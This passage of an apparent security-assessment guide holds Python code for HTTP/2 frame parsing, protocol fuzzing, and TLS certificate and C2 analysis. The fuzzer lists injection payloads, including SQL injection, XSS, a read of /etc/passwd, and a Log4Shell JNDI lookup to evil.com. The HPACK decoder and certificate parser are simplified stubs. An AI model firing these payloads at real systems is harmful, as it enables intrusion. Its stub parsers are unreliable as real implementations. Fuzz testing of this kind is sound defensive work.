    def __init__(self):
        self.frames: List[HTTP2Frame] = []
        self.streams: Dict[int, List[HTTP2Frame]] = {}
        self.settings: Dict[str, HTTP2Settings] = {'client': HTTP2Settings(), 'server': HTTP2Settings()}

    def parse_frames(self, data: bytes) -> List[HTTP2Frame]:
        """Parse HTTP/2 frames from raw data."""
        frames = []
        offset = 0

        # Skip connection preface if present
        if data.startswith(self.PREFACE):
            offset = len(self.PREFACE)

        while offset + 9 <= len(data):
            # Frame header: 3 bytes length + 1 byte type + 1 byte flags + 4 bytes stream ID
            frame_length = int.from_bytes(data[offset:offset+3], 'big')
            frame_type = data[offset+3]
            frame_flags = data[offset+4]
            stream_id = int.from_bytes(data[offset+5:offset+9], 'big') & 0x7FFFFFFF

            offset += 9

            if offset + frame_length > len(data):
                break

            payload = data[offset:offset+frame_length]
            offset += frame_length

            frame = HTTP2Frame(
                length=frame_length,
                frame_type=frame_type,
                flags=frame_flags,
                stream_id=stream_id,
                payload=payload,
            )

            frames.append(frame)

            if stream_id not in self.streams:
                self.streams[stream_id] = []
            self.streams[stream_id].append(frame)

        self.frames = frames
        return frames

    def analyze_settings(self, frames: List[HTTP2Frame], direction: str = 'client'):
        """Analyze SETTINGS frames for configuration issues."""
        for frame in frames:
            if frame.type_name == 'SETTINGS':
                settings = self._parse_settings(frame.payload)
                if direction == 'client':
                    self.settings['client'] = settings
                else:
                    self.settings['server'] = settings

    def _parse_settings(self, payload: bytes) -> HTTP2Settings:
        """Parse SETTINGS frame payload."""
        settings = HTTP2Settings()
        offset = 0

        while offset + 6 <= len(payload):
            setting_id = int.from_bytes(payload[offset:offset+2], 'big')
            value = int.from_bytes(payload[offset+2:offset+6], 'big')
            offset += 6

            if setting_id == 0x1:  # SETTINGS_HEADER_TABLE_SIZE
                settings.header_table_size = value
            elif setting_id == 0x2:  # SETTINGS_ENABLE_PUSH
                settings.enable_push = value
            elif setting_id == 0x3:  # SETTINGS_MAX_CONCURRENT_STREAMS
                settings.max_concurrent_streams = value
            elif setting_id == 0x4:  # SETTINGS_INITIAL_WINDOW_SIZE
                settings.initial_window_size = value
            elif setting_id == 0x5:  # SETTINGS_MAX_FRAME_SIZE
                settings.max_frame_size = value
            elif setting_id == 0x6:  # SETTINGS_MAX_HEADER_LIST_SIZE
                settings.max_header_list_size = value

        return settings

    def detect_security_issues(self) -> List[dict]:
        """Detect security issues in HTTP/2 configuration."""
        findings = []

        # Check for SETTINGS_ENABLE_PUSH = 1 (potential for server push abuse)
        if self.settings['server'].enable_push == 1:
            findings.append({
                'type': 'server_push_enabled',
                'severity': 'low',
                'description': 'Server push is enabled, which could be used for cache poisoning attacks',
            })

        # Check for large MAX_FRAME_SIZE
        if self.settings['server'].max_frame_size > 16384:
            findings.append({
                'type': 'large_max_frame_size',
                'severity': 'info',
                'description': f'MAX_FRAME_SIZE is {self.settings["server"].max_frame_size} (default: 16384)',
            })

        # Check for HEADERS overflow potential
        for stream_id, stream_frames in self.streams.items():
            headers_frames = [f for f in stream_frames if f.type_name == 'HEADERS']
            total_header_size = sum(f.length for f in headers_frames)
            if total_header_size > 100000:  # > 100KB of headers
                findings.append({
                    'type': 'headers_overflow',
                    'severity': 'medium',
                    'stream_id': stream_id,
                    'total_header_size': total_header_size,
                    'description': 'Large header block may indicate header injection or abuse',
                })

        return findings

    def extract_headers(self, frame: HTTP2Frame) -> Dict[str, str]:
        """Extract HTTP/2 headers from a HEADERS frame."""
        # Simplified HPACK decoding
        headers = {}
        offset = 0
        payload = frame.payload

        while offset < len(payload):
            byte = payload[offset]

            if byte & 0x80:  # Indexed header
                index = byte & 0x7F
                offset += 1
                if byte & 0x40:  # 6-bit
                    index = ((byte & 0x3F) << 8) | payload[offset]
                    offset += 1
                headers[f'indexed_{index}'] = f'header_{index}'
            elif byte & 0xC0 == 0x40:  # Literal with incremental indexing
                offset += 1
                name_len = payload[offset] if offset < len(payload) else 0
                offset += 1
                name = payload[offset:offset+name_len].decode('ascii', errors='replace')
                offset += name_len
                if offset < len(payload):
                    value_len = payload[offset]
                    offset += 1
                    value = payload[offset:offset+value_len].decode('ascii', errors='replace')
                    offset += value_len
                    headers[name] = value
            elif byte & 0xE0 == 0x20:  # Size update
                offset += 1
                size = 0
                while offset < len(payload) and payload[offset] & 0x80:
                    size = (size << 7) | (payload[offset] & 0x7F)
                    offset += 1
                if offset < len(payload):
                    size = (size << 7) | payload[offset]
                    offset += 1
            else:  # Literal without indexing or never indexed
                offset += 1
                if offset < len(payload):
                    name_len = payload[offset]
                    offset += 1
                    name = payload[offset:offset+name_len].decode('ascii', errors='replace')
                    offset += name_len
                    if offset < len(payload):
                        value_len = payload[offset]
                        offset += 1
                        value = payload[offset:offset+value_len].decode('ascii', errors='replace')
                        offset += value_len
                        headers[name] = value

        return headers
```

### Protocol Fuzzing Surface Analysis

Identifying protocol fields suitable for fuzzing to discover vulnerabilities.

```python
from dataclasses import dataclass, field
from typing import List, Dict, Any
import random

@dataclass
class FuzzTarget:
    """A specific field or section to fuzz in a protocol."""
    name: str
    offset: int
    size: int
    field_type: str
    fuzz_type: str  # 'boundary', 'format', 'injection', 'overflow'
    priority: int = 1
    notes: str = ''

@dataclass
class FuzzCase:
    """A single fuzz test case."""
    target: str
    fuzz_type: str
    input_data: bytes
    description: str
    expected_behavior: str

class ProtocolFuzzer:
    """Generate fuzzing inputs for protocol implementations."""

    BOUNDARY_VALUES = {
        'uint8': [0, 1, 0x7F, 0x80, 0xFF],
        'uint16': [0, 1, 0x7FFF, 0x8000, 0xFFFE, 0xFFFF],
        'uint32': [0, 1, 0x7FFFFFFF, 0x80000000, 0xFFFFFFFE, 0xFFFFFFFF],
        'uint64': [0, 1, 0x7FFFFFFFFFFFFFFF, 0x8000000000000000],
        'bytes': [b'', b'\x00', b'\xff' * 100, b'A' * 1000],
    }

    INJECTION_PAYLOADS = [
        b"'; DROP TABLE users; --",
        b"<script>alert(1)</script>",
        b"../../../etc/passwd",
        b"%0a%0d%0a%0d",
        b"\x00" * 100,
        b"{{7*7}}",
        b"${7*7}",
        b"${jndi:ldap://evil.com}",
    ]

    def __init__(self, protocol_definition):
        self.protocol = protocol_definition
        self.targets: List[FuzzTarget] = []

    def identify_fuzz_targets(self) -> List[FuzzTarget]:
        """Identify fields suitable for fuzzing."""
        targets = []

        for field_def in self.protocol.fields:
            # Length fields are high-priority fuzz targets
            if field_def.is_length_field:
                targets.append(FuzzTarget(
                    name=field_def.name,
                    offset=field_def.offset,
                    size=field_def.size,
                    field_type=field_def.field_type,
                    fuzz_type='overflow',
                    priority=1,
                    notes='Length field - test with values exceeding buffer',
                ))

            # Type/opcode fields
            if field_def.field_type in ('uint8', 'uint16') and 'type' in field_def.name.lower():
                targets.append(FuzzTarget(
                    name=field_def.name,
                    offset=field_def.offset,
                    size=field_def.size,
                    field_type=field_def.field_type,
                    fuzz_type='format',
                    priority=2,
                    notes='Type field - test with undefined values',
                ))

            # String fields
            if field_def.field_type in ('string', 'bytes'):
                targets.append(FuzzTarget(
                    name=field_def.name,
                    offset=field_def.offset,
                    size=field_def.size,
                    field_type=field_def.field_type,
                    fuzz_type='injection',
                    priority=2,
                    notes='String field - test with injection payloads',
                ))

        # Add protocol-level targets
        if self.protocol.magic_bytes:
            targets.append(FuzzTarget(
                name='magic_bytes',
                offset=0,
                size=len(self.protocol.magic_bytes),
                field_type='bytes',
                fuzz_type='format',
                priority=1,
                notes='Magic bytes - test with modified magic',
            ))

        return sorted(targets, key=lambda t: t.priority)

    def generate_fuzz_cases(self, target: FuzzTarget, base_packet: bytes) -> List[FuzzCase]:
        """Generate fuzz test cases for a specific target."""
        cases = []

        if target.fuzz_type == 'overflow':
            cases.extend(self._generate_overflow_cases(target, base_packet))
        elif target.fuzz_type == 'format':
            cases.extend(self._generate_format_cases(target, base_packet))
        elif target.fuzz_type == 'injection':
            cases.extend(self._generate_injection_cases(target, base_packet))

        return cases

    def _generate_overflow_cases(self, target: FuzzTarget, base: bytes) -> List[FuzzCase]:
        """Generate overflow fuzz cases."""
        cases = []
        boundary_values = self.BOUNDARY_VALUES.get(target.field_type, [0, 1, 0xFF])

        for value in boundary_values:
            fuzzed = bytearray(base)
            value_bytes = value.to_bytes(target.size, byteorder='big')
            if target.offset + target.size <= len(fuzzed):
                fuzzed[target.offset:target.offset+target.size] = value_bytes
                cases.append(FuzzCase(
                    target=target.name,
                    fuzz_type='overflow',
                    input_data=bytes(fuzzed),
                    description=f'Set {target.name} to boundary value {value}',
                    expected_behavior='Application should handle oversized/undersized length gracefully',
                ))

        # Test maximum values
        max_value = (2 ** (target.size * 8)) - 1
        fuzzed = bytearray(base)
        value_bytes = max_value.to_bytes(target.size, byteorder='big')
        if target.offset + target.size <= len(fuzzed):
            fuzzed[target.offset:target.offset+target.size] = value_bytes
            cases.append(FuzzCase(
                target=target.name,
                fuzz_type='overflow',
                input_data=bytes(fuzzed),
                description=f'Set {target.name} to MAX value {max_value}',
                expected_behavior='Should reject or handle gracefully without crash',
            ))

        # Test zero
        fuzzed = bytearray(base)
        if target.offset + target.size <= len(fuzzed):
            fuzzed[target.offset:target.offset+target.size] = b'\x00' * target.size
            cases.append(FuzzCase(
                target=target.name,
                fuzz_type='overflow',
                input_data=bytes(fuzzed),
                description=f'Set {target.name} to zero',
                expected_behavior='Should handle zero-length/zero-value gracefully',
            ))

        return cases

    def _generate_format_cases(self, target: FuzzTarget, base: bytes) -> List[FuzzCase]:
        """Generate format fuzz cases."""
        cases = []

        # Unknown type values
        max_type = (2 ** (target.size * 8)) - 1
        for invalid_type in [max_type, max_type - 1, max_type // 2]:
            fuzzed = bytearray(base)
            value_bytes = invalid_type.to_bytes(target.size, byteorder='big')
            if target.offset + target.size <= len(fuzzed):
                fuzzed[target.offset:target.offset+target.size] = value_bytes
                cases.append(FuzzCase(
                    target=target.name,
                    fuzz_type='format',
                    input_data=bytes(fuzzed),
                    description=f'Invalid type value {invalid_type}',
                    expected_behavior='Should reject unknown type gracefully',
                ))

        return cases

    def _generate_injection_cases(self, target: FuzzTarget, base: bytes) -> List[FuzzCase]:
        """Generate injection fuzz cases."""
        cases = []

        for payload in self.INJECTION_PAYLOADS:
            fuzzed = bytearray(base)
            # Truncate or pad payload to fit field size
            field_payload = payload[:target.size]
            if target.offset + len(field_payload) <= len(fuzzed):
                fuzzed[target.offset:target.offset+len(field_payload)] = field_payload
                cases.append(FuzzCase(
                    target=target.name,
                    fuzz_type='injection',
                    input_data=bytes(fuzzed),
                    description=f'Injection payload in {target.name}',
                    expected_behavior='Should sanitize input and not execute injection',
                ))

        return cases

    def generate_fuzzing_plan(self, base_packet: bytes) -> dict:
        """Generate a complete fuzzing plan."""
        targets = self.identify_fuzz_targets()
        plan = {
            'protocol': self.protocol.name,
            'total_targets': len(targets),
            'targets': [],
            'estimated_cases': 0,
        }

        for target in targets:
            cases = self.generate_fuzz_cases(target, base_packet)
            plan['targets'].append({
                'name': target.name,
                'fuzz_type': target.fuzz_type,
                'priority': target.priority,
                'case_count': len(cases),
                'cases': cases,
            })
            plan['estimated_cases'] += len(cases)

        return plan
```

### TLS Certificate Analysis

Analyzing TLS certificates for security assessment and C2 detection.

```python
from datetime import datetime
from dataclasses import dataclass
from typing import List, Dict, Optional
import hashlib

@dataclass
class TLSCertificateInfo:
    """Parsed TLS certificate information."""
    subject: str
    issuer: str
    serial_number: str
    not_before: datetime
    not_after: datetime
    san: List[str]
    key_type: str
    key_size: int
    signature_algorithm: str
    is_self_signed: bool
    is_expired: bool
    days_until_expiry: int
    sha1_fingerprint: str
    sha256_fingerprint: str

class TLSAnalyzer:
    """Analyze TLS certificates for security assessment."""

    def __init__(self):
        self.certificates: List[TLSCertificateInfo] = []

    def analyze_certificate_chain(self, chain_data: List[bytes]) -> List[dict]:
        """Analyze a complete certificate chain."""
        findings = []

        for i, cert_data in enumerate(chain_data):
            cert_info = self._parse_certificate(cert_data)
            self.certificates.append(cert_info)

            # Check for self-signed certificate
            if cert_info.is_self_signed:
                findings.append({
                    'type': 'self_signed_certificate',
                    'severity': 'high',
                    'certificate': cert_info.subject,
                    'description': 'Self-signed certificate detected',
                })

            # Check for expired certificate
            if cert_info.is_expired:
                findings.append({
                    'type': 'expired_certificate',
                    'severity': 'critical',
                    'certificate': cert_info.subject,
                    'expired_on': cert_info.not_after,
                })

            # Check for weak key
            if cert_info.key_size < 2048 and cert_info.key_type == 'RSA':
                findings.append({
                    'type': 'weak_key',
                    'severity': 'high',
                    'certificate': cert_info.subject,
                    'key_type': cert_info.key_type,
                    'key_size': cert_info.key_size,
                })

            # Check for weak signature algorithm
            if 'sha1' in cert_info.signature_algorithm.lower():
                findings.append({
                    'type': 'weak_signature',
                    'severity': 'high',
                    'certificate': cert_info.subject,
                    'algorithm': cert_info.signature_algorithm,
                })

            # Check for wildcard certificate
            if any(san.startswith('*.') for san in cert_info.san):
                findings.append({
                    'type': 'wildcard_certificate',
                    'severity': 'info',
                    'certificate': cert_info.subject,
                    'wildcards': [s for s in cert_info.san if s.startswith('*.')],
                })

        # Check chain validation
        chain_findings = self._validate_chain()
        findings.extend(chain_findings)

        return findings

    def _parse_certificate(self, cert_data: bytes) -> TLSCertificateInfo:
        """Parse a DER-encoded certificate."""
        # Simplified - real implementation would use cryptography library
        return TLSCertificateInfo(
            subject='',
            issuer='',
            serial_number='',
            not_before=datetime.now(),
            not_after=datetime.now(),
            san=[],
            key_type='RSA',
            key_size=2048,
            signature_algorithm='SHA256withRSA',
            is_self_signed=False,
            is_expired=False,
            days_until_expiry=365,
            sha1_fingerprint=hashlib.sha1(cert_data).hexdigest(),
            sha256_fingerprint=hashlib.sha256(cert_data).hexdigest(),
        )

    def _validate_chain(self) -> List[dict]:
        """Validate the certificate chain."""
        findings = []

        if len(self.certificates) == 0:
            return findings

        # Check if chain is complete
        if len(self.certificates) < 2:
            findings.append({
                'type': 'incomplete_chain',
                'severity': 'medium',
                'description': 'Certificate chain has fewer than 2 certificates',
            })

        # Check if leaf certificate matches intermediate
        for i in range(len(self.certificates) - 1):
            leaf = self.certificates[i]
            issuer = self.certificates[i + 1]
            if leaf.issuer != issuer.subject:
                findings.append({
                    'type': 'chain_mismatch',
                    'severity': 'critical',
                    'description': f'Certificate {i} issuer does not match certificate {i+1} subject',
                })

        return findings

    def fingerprint_certificates(self) -> List[dict]:
        """Generate fingerprints for all certificates."""
        fingerprints = []
        for cert in self.certificates:
            fingerprints.append({
                'subject': cert.subject,
                'sha1': cert.sha1_fingerprint,
                'sha256': cert.sha256_fingerprint,
                'issuer': cert.issuer,
                'valid_until': cert.not_after.isoformat(),
            })
        return fingerprints

    def detect_c2_certificates(self, certificates: List[TLSCertificateInfo]) -> List[dict]:
        """Identify certificates commonly associated with C2 infrastructure."""
        c2_indicators = []

        for cert in certificates:
            # Short-lived certificates (< 30 days)
            days_valid = (cert.not_after - cert.not_before).days
            if days_valid < 30:
                c2_indicators.append({
                    'type': 'short_lived_certificate',
                    'subject': cert.subject,
                    'validity_days': days_valid,
                    'reason': 'C2 infrastructure often uses short-lived certificates',
                })

            # Let's Encrypt certificates on suspicious domains
            if 'Let\'s Encrypt' in cert.issuer:
                c2_indicators.append({
                    'type': 'free_certificate',
                    'subject': cert.subject,
                    'issuer': cert.issuer,
                    'reason': 'Frequently used by C2 infrastructure for free TLS',
                })

            # Certificates with organization field missing
            if 'O=' not in cert.subject:
                c2_indicators.append({
                    'type': 'missing_organization',
                    'subject': cert.subject,
                    'reason': 'Certificates without organization are common in C2',
                })

        return c2_indicators
```
